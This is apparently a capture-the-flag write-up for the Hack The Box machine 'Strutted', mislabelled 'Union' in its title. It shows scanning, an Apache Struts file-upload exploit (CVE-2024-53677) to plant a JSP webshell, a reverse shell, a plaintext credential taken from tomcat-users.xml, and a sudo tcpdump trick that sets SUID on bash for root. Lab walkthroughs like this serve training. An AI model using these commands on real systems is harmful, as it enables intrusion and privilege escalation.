---
layout: single
title: Union - Hack The Box
excerpt: "'Strutted' is an medium-difficulty Linux machine featuring a website for a company offering image hosting solutions. The website provides a Docker container with the version of Apache Struts that is vulnerable to '[CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677)', which is leveraged to gain a foothold on the system. Further enumeration reveals the 'tomcat-users.xml' file with a plaintext password used to authenticate as 'james'. For privilege escalation, we abuse 'tcpdump' while being used with 'sudo' to create a copy of the 'bash' binary with the 'SUID' bit set, allowing us to gain a 'root' shell."
date: 2025-06-19
classes: wide
header:
  teaser: /img2/union.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Medium
tags:
  - Information Leakage
  - Apache Struts Exploitation [CVE-2024-53677]
  - Abusing File Upload (Malicious JSP File)
  - Abusing Sudoers Privilege (tcpdump) [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.59
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 12:46 CEST
Nmap scan report for 10.10.11.59
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
```

- Add domain to /etc/hosts

```bash
❯ echo "10.10.11.59 strutted.htb" >> /etc/hosts
```

## Exploitation

- Apache Struts Exploitation (CVE-2024-53677)

![](/img2/Pasted%20image%2020250619161327.png)

![](/img2/Pasted%20image%2020250619161400.png)

> Primero tenemos que bypassear la restricción de la imagen, esto lo conseguimos con los primeros magik numbers correspondientes a una imagen PNG. Una vez bypasseada la restricción podemos abusar de la vulnerabilidad cambiando el nombre del archivo con la función top.UploadFileName propia de Struts.

![](/img2/Pasted%20image%2020250619161722.png)

![](/img2/Pasted%20image%2020250619161802.png)

> Para abusar de esta subida de archivos, podemos subir una webshell usando jsp.

- Reverse Shell

![](/img2/Pasted%20image%2020250619162358.png)

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.59] 59578
bash: cannot set terminal process group (1012): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@strutted:~/webapps/ROOT$ 
```

## Post-exploitation

- Find tomcat-users.xml file

```bash
tomcat@strutted:/var$ find / -name tomcat-users.xml 2>/dev/null
```

```ruby
/etc/tomcat9/tomcat-users.xml
```

```bash
tomcat@strutted:/var$ cat /etc/tomcat9/tomcat-users.xml
```

```ruby
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
<!--
  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>
```

> Encontramos unas credenciales: IT14d6SSP81k

- Pivoting

```bash
❯ ssh james@10.10.11.59
```

```ruby
The authenticity of host '10.10.11.59 (10.10.11.59)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.59' (ED25519) to the list of known hosts.
james@10.10.11.59's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jun 19 02:59:57 PM UTC 2025

  System load:           0.02
  Usage of /:            70.4% of 5.81GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             223
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.59
  IPv6 address for eth0: dead:beef::250:56ff:fe94:a5b

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

5 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Jan 21 13:46:18 2025 from 10.10.14.64
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@strutted:~$ 
```

> Únicamente nos podemos conectar mediante ssh, ya que la migración de usuario esta restringida.

- Find sudoers

```bash
james@strutted:~$ sudo -l
```

```ruby
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

- Abusing Sudoers Privilege (tcpdump) 

```bash
james@strutted:~$ COMMAND='chmod u+s /bin/bash'
```

```bash
james@strutted:~$ TF=$(mktemp)
```

```bash
james@strutted:~$ echo "$COMMAND" > $TF
```

```bash
james@strutted:~$ chmod +x $TF
```

```bash
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

```ruby
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
```

```bash
james@strutted:~$ ls -l /bin/bash
```

```ruby
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

```bash
james@strutted:~$ bash -p
```

```ruby
bash-5.1# 
```


![](/img2/Pasted%20image%2020250619170354.png)